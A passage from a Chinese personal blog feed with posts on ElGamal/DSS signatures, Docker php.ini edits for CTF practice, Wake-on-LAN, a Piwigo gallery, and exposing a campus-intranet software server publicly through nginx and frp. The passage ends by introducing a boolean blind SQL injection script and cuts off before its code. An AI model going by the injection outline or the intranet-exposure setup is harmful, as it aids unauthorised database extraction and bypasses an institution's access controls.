style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，简单移项之后可以得到</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>=</mo><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mi>k</mi><mi>y</mi><mo stretchy="false">)</mo><msup><mi>x</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">a=(m-ky)x^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>。</p><p>相当于如果知道了k，那么攻击者相当于知道了密钥a，这时候就可以伪造身份，以发件人的身份向别人发送信息了。</p></li><li><p>必须使用hash函数</p><p>ppt上说否则容易受到存在性伪造。</p><p>而我认为使用hash函数更有说服力的一点是，Elgamal签名的长度是明文的2倍，所以如果不将明文hash后再签名，那么就会导致传输中，为了发送1个G的信息，你需要生成2个G的签名，这太离谱了，签名肯定是越短越好的，所以hash是一个非常好的解决办法。</p></li></ol><h3 id="dss"><a class="markdownIt-Anchor" href="#dss"></a> DSS</h3><p>DSS是美国数字签名标准，是Elgamal签名的变形，极为类似，其中用到了SHA hash算法。</p><p><img src="https://upyun.wuuconix.link/image-20211021141353110.png" alt="dss正面评价" /></p><p><img src="https://upyun.wuuconix.link/image-20211021141426977.png" alt="dss 负面评价" /></p><h3 id="盲签名和不可否认签名"><a class="markdownIt-Anchor" href="#盲签名和不可否认签名"></a> 盲签名和不可否认签名</h3><p>这两个就不深究了。还无法想象使用场景，应该也不会考。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>专业课</tag>
      
      <tag>crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>快速修改PHP镜像中的php.ini并生效</title>
    <link href="/2021/09/04/php-ini/"/>
    <url>/2021/09/04/php-ini/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-QUVuLYAE" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="657666" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>今天做ctfhub中文件包含的时候，做到了php伪协议。</p><p>为了测试每个协议的生效条件，需要修改<code>php.ini</code>。</p><p>我这里使用的镜像是<code>php:5.6-apache</code>。容器的名称叫<code>php</code>。</p><h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h2><p>我们先进入容器看看<code>php.ini</code>的位置。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> php bash<br><span class="hljs-comment">#进入后</span><br>php <span class="hljs-comment">--ini</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210904235325664.png" alt="php --ini" /></p><p>我们可以了解到<code>php.ini</code>理应的位置是<code>/usr/local/etc/php</code>，但是<code>Loaded Configuration File</code>为空，说明在这个目录下还没有一个<code>php.ini</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210904235502201.png" alt="ls" /></p><p>该目录下只有两个镜像官方给我提供的参考配置文件，我们把其中一份copy一下变成我们自己的<code>php.ini</code>。</p><p>再重新看一看，可以看见这份<code>php.ini</code>已经被正确检测到并加载了。</p><p><img src="https://upyun.wuuconix.link/image-20210904235636027.png" alt="loaded" /></p><p>我们可以利用vscode里的docker插件来对文件进行修改。</p><p><img src="https://upyun.wuuconix.link/image-20210904235802544.png" alt="vscode docker plugin" /></p><p>修改后配置文件不会马上生效。需要在容器里把apache重启一下。可以在容器内部手动重启。还可以直接在外部这样。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> php apache2ctl restart<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20210904235950253.png" alt="docker exec -it php apache2ctl" /></p><p>十分方便。在vscode改完，再运行一下这个命令。配置就生效了。</p><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>更加能够把握php了！</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>php</tag>
      
      <tag>php.ini</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机械革命Z2air实现远程开机</title>
    <link href="/2021/09/03/mechrevo/"/>
    <url>/2021/09/03/mechrevo/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-OIQVEbaf" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1853299465" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>几个月前，我就想要实现远程开机笔记本。配合上<code>RD Client</code>实现真正意义上的远程。</p><p>但是当时遇到了各种问题，首先是进不了BIOS，还一度卡开机logo。后来查明原来是硬盘的原因，便慷慨地把那块512G的SSD送给了<code>Comrade Wangyang</code>2333。<code>Comrade Wangyang</code>也回赠了我一个1T的移动硬盘，事实证明移动硬盘更符合我的需求。笔记本自带的512G已经完全能够满足平常的需要了。平时若有想备份的东西便可以放在移动硬盘里，而不必插一块大容量ssd在笔记本里，一直供着电但空空如也。</p><p>当时解决了BIOS问题后，还在网卡设置里进行了一番探索，改了各种配置，就是无法实现远程开机，每次测试都要关机也把我折磨得不轻。便搁置了许久。</p><p>今天闲来无事，遂决定再试试。没想到，几乎没怎么设置便成功了。</p><h2 id="笔记本的设置"><a class="markdownIt-Anchor" href="#笔记本的设置"></a> 笔记本的设置</h2><p>以下给出我认为比较重要的点，当然可能还有其他的必要设置。</p><ol><li><p>在BIOS的<code>Boot</code>中<code>Lan Remote Boot</code>设置为<code>Enabled</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210903153248757.png" alt="BIOS LAN Remote Boot" /></p></li><li><p>打开设备管理器，点开网络适配器，找到你的网卡。</p><p><img src="https://upyun.wuuconix.link/image-20210903153536749.png" alt="网络适配器" /></p><p>这里有两个，看名称，我估计第一个是无线网卡控制wifi的，第二个是控制以太网的网卡。</p><p>因为我在寝室一直连着网线，这里就着重讲一下第二个网卡。</p><p>网卡右键属性，打开属性面板。在面板中找电源管理。把所有的选项都勾选。</p><p><img src="https://upyun.wuuconix.link/image-20210903153843935.png" alt="网卡电源管理" /></p><p>然后在高级选项中着重注意打开这两个选项。</p><p><img src="https://upyun.wuuconix.link/image-20210903153943712.png" alt="关机 网络唤醒" /></p><p><img src="https://upyun.wuuconix.link/image-20210903154007675.png" alt="魔术封包唤醒" /></p><p>这样应该就能实现网络唤醒了。接下来我介绍一下可以使用的网络唤醒方法。</p></li></ol><h2 id="wake-on-lan客户端"><a class="markdownIt-Anchor" href="#wake-on-lan客户端"></a> Wake On Lan客户端</h2><ol><li><p>最方便的应该算安卓app<code>Wake On Lan</code>了。谷歌商店就能直接下载。</p><div align='center'><img src="https://upyun.wuuconix.link/image-20210903154409192.png" alt="Wake On Lan" style="zoom:50%;" /> </div>软件的设置也十分方便。点击界面右下角的加号添加设备。<p>在<code>MAC地址</code>你输入你笔记本的MAC地址。</p><p>在<code>主机/IP/广播地址</code>中输入你笔记本的ip地址。</p><div align='center'><img src="https://upyun.wuuconix.link/image-20210903154630837.png" alt="软件设置" style="zoom:50%;" /></div>设置完毕。点击即可远程唤醒。</li><li><p>其实不用app也是可以的，由于我在实验室有一台常开机的Ubuntu Server，我便试着用命令来远程唤醒，最后找到了一个apt支持的命令<code>wakeonlan</code>。使用方法也十分简单。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt update &amp;&amp; apt install wakeonlan <span class="hljs-comment">#安装wakeonlan命令</span><br>wakeonlan -i 电脑ip地址 电脑mac地址<br></code></pre></td></tr></table></figure></li><li><p>如果你在你的手机或者平板中安装了termux。还可以用termux中pkg安装<code>wol</code>来唤醒。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pkg install wol <span class="hljs-comment">#安装</span><br>wol -h 电脑ip 电脑mac<br></code></pre></td></tr></table></figure></li><li><p>还可以使用使用github上得开源项目<a href="https://github.com/basildane/WakeOnLAN">basildane/WakeOnLAN</a></p><p>按照它的说明配置好文件后即可唤醒。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 wol.py mechrevo<br></code></pre></td></tr></table></figure></li></ol><h2 id="技巧"><a class="markdownIt-Anchor" href="#技巧"></a> 技巧</h2><p>我们测试的时候不用把电脑关机，这个唤醒命令支持唤醒睡眠中的笔记本。所以我们只要让笔记本睡眠来测试即可。</p><p>可以大大降低我们高血压的几率2333。</p><h2 id="视频展示"><a class="markdownIt-Anchor" href="#视频展示"></a> 视频展示</h2><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=762856393&bvid=BV1u64y1h7Y5&cid=402035317&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;" ></iframe></div><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>解决了心头大患！这下真是随时随地可以连接笔记本了！想什么时候关，想什么时候开都可以2333。</p><h2 id="2021年9月9日更新"><a class="markdownIt-Anchor" href="#2021年9月9日更新"></a> 2021年9月9日更新</h2><p>由于学校的路由器过于煞笔，没有在arp表中留下我的笔记本的ip和mac的绑定信息，所以关机或者睡眠两分钟以上，就无法唤醒了。<br />然后我买了一个路由器解决了这个问题。具体文章请移步  <a href="https://wuuconix.link/2021/09/08/padavan/">小米路由器4A 刷入 Breed 与 Padavan</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>mechrevo</tag>
      
      <tag>wol</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透反代哈课表资源站实现校外下载</title>
    <link href="/2021/09/02/resource/"/>
    <url>/2021/09/02/resource/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-ZzVNktky" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="28442964" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>近日，z同学欲下载专业音乐制作软件FL Studio。四处寻找破解版无果。</p><p>我便看了一眼哈课表的资源列表。</p><div align='center'><img src="https://upyun.wuuconix.link/image-20210902213238168.png" alt="哈课表资源列表" style="zoom:50%;" /></div><p>我发现FL Studio赫然在列。接下去就是如何把这个软件分享给她的问题了。</p><p>众所周知，在哈课表资源列表中的链接是校园内网的链接。很显然，哈课表技术部在学校某台服务器上存储了这些 软件的安装包，并提供了一个下载服务。</p><p>z同学在校外，无法访问学校内网，那是不是我只能先下载好后再发给她呢？这未免有些麻烦了。</p><h2 id="解决过程"><a class="markdownIt-Anchor" href="#解决过程"></a> 解决过程</h2><p>我们先观察下载链接。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.245</span>.<span class="hljs-number">146.27</span>:<span class="hljs-number">8008</span><span class="hljs-regexp">/FL%20Studio/</span>flstudio_win_20.<span class="hljs-number">7.2</span>.<span class="hljs-number">1863</span>.exe<br></code></pre></td></tr></table></figure><p>首先我在实验室的主机是能够直接访问到该ip的。那我们可以先用做个反代，先让服务看起来是我的主机提供的2333。以下是nginx配置文件。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">8008</span>;<br>   <span class="hljs-attribute">server_name</span>  <span class="hljs-number">127.0.0.1</span>;<br>   <span class="hljs-section">location</span> / &#123;<br>      <span class="hljs-attribute">root</span>  /var/www/html;<br>      <span class="hljs-attribute">proxy_pass</span> http://10.245.146.27:8008/;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样做完后，从表面看，资源下载的服务就是我的实验室机器的8008端口提供的了。</p><p>然后我们就得把&quot;我的服务&quot;实现公网访问了。</p><p>要实现公网访问，必然需要内网穿透。考虑到下载速度因素，我在我带宽较大的洛杉矶的主机上下了个frp。开启frps。配置如下。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br><span class="hljs-attr">vhost_http_port</span> = <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>然后让我的实验室主机的frpc去连接，因为我的实验室主机一直与阿里云服务器内网穿透着。我们需要新建一个新的<code>frpc.ini</code>。这里就叫做<code>frpc2.ini</code>。配置如下。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = california.wuuconix.xyz<br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-section">[hit]</span><br><span class="hljs-attr">type</span> = http<br><span class="hljs-attr">local_port</span> = <span class="hljs-number">8008</span><br><span class="hljs-attr">custom_domains</span> = hit.wuuconix.link<br></code></pre></td></tr></table></figure><p>然后运行一个新的frp客户端程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">nohup</span> ./frpc -c ./frpc2.ini &gt;frpc2.log 2&gt;&amp;1 &amp;<br></code></pre></td></tr></table></figure><p>这样实现了访问<code>http://hit.wuuconix.link:8080/FL%20Studio/flstudio_win_20.7.2.1863.exe</code>就能够下载文件了。</p><p>接下来我们再配置一下洛杉矶主机的nginx，操作一波，去掉端口并实现https。配置如下。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<span class="hljs-comment"># https 监听的是 443端口</span><br>   <span class="hljs-attribute">server_name</span>  hit.wuuconix.link;<br><br>   <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">100</span>;<br><br>   <span class="hljs-attribute">ssl_session_cache</span>   shared:SSL:<span class="hljs-number">10m</span>;<br>   <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">10m</span>;<br><br>   <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/ssl-link/fullchain.crt; <span class="hljs-comment"># 证书路径</span><br>   <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl-link/private.pem; <span class="hljs-comment"># 请求认证 key 的路径</span><br><br>   <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">1</span> TLSv1.<span class="hljs-number">2</span>;<br>   <span class="hljs-attribute">ssl_ciphers</span> ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;<br>   <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;<br>   <span class="hljs-attribute">ssl_session_cache</span> shared:SSL:<span class="hljs-number">10m</span>;<br><br>   <span class="hljs-attribute">index</span> index.html index.htm;<br>   <span class="hljs-section">location</span> / &#123;<br>      <span class="hljs-attribute">root</span>  /var/www/html;<br>      <span class="hljs-attribute">proxy_pass</span> http://hit.wuuconix.link:8080;<br>   &#125;<br>&#125;<br><br><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>   <span class="hljs-attribute">server_name</span>  hit.wuuconix.link;<br>   <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> https://<span class="hljs-variable">$server_name</span><span class="hljs-variable">$1</span> <span class="hljs-literal">permanent</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样就能实现这样的效果。</p><p>用户访问<code>http://hit.wuuconix.link/FL%20Studio/flstudio_win_20.7.2.1863.exe</code>。会被重写为<code>https://hit.wuuconix.link/FL%20Studio/flstudio_win_20.7.2.1863.exe</code>。然后用户的界面不会变了，开始下载了。但是实际上这个443端口是一层反代，实际上提供服务的还是我们的frp端口<code>http://hit.wuuconix.link:8080</code>。</p><p>所以本质没变，但是表面上看着就很舒服了，没有端口，还是https，看着十分正式。</p><h2 id="之后的故事"><a class="markdownIt-Anchor" href="#之后的故事"></a> 之后的故事</h2><p>这样已经满足一开始的目的了，z同学可以在校外直接访问<code>http://hit.wuuconix.link/FL%20Studio/flstudio_win_20.7.2.1863.exe</code>实现下载哈课表提供的资源。</p><p>速度也教快，呈波浪形233，平均速度大概是<code>1MB/s</code>，峰值达到了<code>3MB/s</code>。比我的阿里云主机可快多了😂。</p><p><img src="https://upyun.wuuconix.link/image-20210902215531583.png" alt="迅雷下载速度曲线" /></p><p>然后我看着哈课表资源列表中的这么多资源 ，我打算做个列表开方便点击后直接下载。</p><p>我已经准备好vue，开始准备一个个写链接的时候，我访问了一下<code>http://10.245.146.27:8008</code>。</p><p><img src="https://upyun.wuuconix.link/image-20210902215824526.png" alt="Go Http file server" /></p><p>原来它有一个网页（</p><p>而我是反代的它，那不是直接访问<code>http://hit.wuuconix.link</code>就能访问到这个列表嘛！我还在哈课表上一个个软件复制链接做页面2333，感觉自己蠢爆了。</p><p><img src="https://upyun.wuuconix.link/image-20210902220112579.png" alt="资源列表" /></p><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>这个暑假学到的内网穿透和nginx反代都派上了用场，在生活中真正派上了用尝。</p><p>如果你在校外，但想下载哈课表提供的资源的话，欢迎访问这个链接。</p><p><a href="https://hit.wuuconix.link/">https://hit.wuuconix.link/</a> 🎉</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>frp</tag>
      
      <tag>nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Piwigo搭建个人画廊并允许上传视频</title>
    <link href="/2021/08/31/piwigo/"/>
    <url>/2021/08/31/piwigo/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-pkFUyprU" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1351586251" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>前些日子突然发现了国外服务器是可以直接访问的，不需要翻墙，突然觉得自己买阿里云，买国内域名，备案的行为蠢爆了。因为国外的服务器不光不用备案，同时还有一个国内服务器比不了的点，那就是带宽。</p><p>我的阿里云服务器是5MB/s，在同价格的学生机里已经算带宽大的了。而国外服务器的带宽全部都是<code>1GB/s</code>往上。也就是最辣鸡的服务器都有<code>100MB/s</code>的带宽。</p><p>之前在阿里云服务器上开了一个nextcloud，结果速度太慢，后来就一直没用了。</p><p>今天决定好好利用一下这个国外服务器的带宽，开设一些需要高带宽的服务。想了一会儿，我觉得开设一个个人画廊非常合适。</p><h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h2><p>我在网上搜了一圈，发现一个用php编写<code>piwigo</code>的开源程序貌似非常好使。</p><p>更好的是，官方提供了<a href="https://hub.docker.com/r/linuxserver/piwigo">docker镜像</a>，这样部署就变得十分简单了，跟着官方文档来就行。</p><p><img src="https://upyun.wuuconix.link/image-20210901021350251.png" alt="docker镜像" /></p><p>之后我遇到了一个问题，单单放图片好像不太行，用不了多少带宽。应该放些视频上去2333。</p><p>但是上传界面只允许上传图片格式的文件。</p><p>于是我就搜索<code>piwigo 如何上传视频?</code> 结果发现一片死寂的piwigo论坛2333。</p><p><img src="https://upyun.wuuconix.link/image-20210901015215784.png" alt="dead piwigo discuss" /></p><p>我花了很长时间来搜索和设置，最后发现piwigo的一个插件[<a href="https://github.com/Piwigo/piwigo-videojs/wiki/How-to-add-videos">piwigo-videojs</a>真的讲的非常清楚了。</p><p><img src="https://upyun.wuuconix.link/image-20210901015706216.png" alt="upload_form_all_types" /></p><p>它的wiki开局就指出了如何支持所有类型文件上传的方法。</p><h2 id="展示"><a class="markdownIt-Anchor" href="#展示"></a> 展示</h2><p><img src="https://upyun.wuuconix.link/image-20210901020453462.png" alt="展示1" /></p><p><img src="https://upyun.wuuconix.link/image-20210901020056520.png" alt="展示2" /></p><p><img src="https://upyun.wuuconix.link/image-20210901020407006.png" alt="后台1" /></p><p><img src="https://upyun.wuuconix.link/image-20210901020212119.png" alt="后台2" /></p><h2 id="战术总结"><a class="markdownIt-Anchor" href="#战术总结"></a> 战术总结</h2><p>欢迎参观武丑兄的画廊 <a href="https://gallery.wuuconix.xyz/">wuuconix’s gallery</a> 🎉</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>gallery</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL布尔盲注自动化脚本的实现</title>
    <link href="/2021/08/27/sql-blind/"/>
    <url>/2021/08/27/sql-blind/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-TXltNHcl" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="411349020" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>很久以前做过布尔盲注的题目，但是当时用的是网上的代码，跑出来flag了也是一知半解，没有收获。</p><p>今天花了一下午的时间写了一个布尔盲注的脚本。</p><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><p>布尔盲注使用场景的特征十分明显，即界面不会给出查询的具体结果，也不会给你报错信息。而只会告诉你查询成功还是查询失败。</p><p>这就需要我们去利用一些神奇的函数比如<code>substr</code>,<code>ascii</code>,<code>length</code>来猜测。</p><p>猜测什么呢？首先猜测数据库的长度，知道了长度，就去猜数据库每个字符。知道了数据库，就去猜数据表的个数，表名长度，具体表名等等等等。也就是所有的一切都是你需要用上面的函数来猜出来的。</p><p>如果手工来实现这一过程，就会变得非常繁琐，这里我花了一个下午的时间写了一个盲注的脚本。</p><p>运行过程十分舒适和人性化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span 